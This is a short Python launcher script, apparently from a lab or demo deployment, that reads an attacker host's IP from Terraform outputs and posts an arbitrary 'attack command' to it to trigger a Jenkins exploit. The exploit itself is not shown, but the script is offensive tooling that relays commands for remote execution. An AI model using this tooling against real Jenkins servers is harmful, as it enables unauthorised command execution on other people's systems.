#!/usr/bin/env python3

import requests
import argparse
from python_terraform import Terraform
import json
import sys


def get_terraform_outputs() -> dict:
    tf = Terraform(working_dir='./WebInDeploy')
    rc, out, err = tf.cmd('output', '-json')

    if rc == 0:
        try:
            return json.loads(out)
        except ValueError as ve:
            print('Could not parse terraform outputs!')
            return dict()


def main(cli: str) -> None:

    print('Attempting to launch exploit...\n')
    outputs = get_terraform_outputs()

    attacker = outputs['ATTACKER_IP']['value']
    payload = dict()
    payload['cli'] = cli

    headers = dict()
    headers['Content-Type'] = 'application/json'
    headers['Accept'] = '*/*'

    try:
        resp = requests.post(f'http://{attacker}:5000/send', data=json.dumps(payload), headers=headers)
        if resp.status_code == 200:
            print('Command Successfully Executed!\n')
            print(resp.text)
            sys.exit(0)
        else:
            print('Could not Execute Command!\n')
            print(resp.text)
            sys.exit(0)
    except ConnectionRefusedError as cre:
        print('Could not connect to attacker instance!')
        sys.exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Send Jenkins Attack Command')
    parser.add_argument('-c', '--cli', help='Attack Command', required=True)
    parser.add_argument('-m', '--manual_cli', help='Manual Attack Command', required=False)

    args = parser.parse_args()
    cli = args.cli
    mcli = args.manual_cli

    if mcli is not None and mcli != '':
        main(mcli)
    else:
        main(cli)

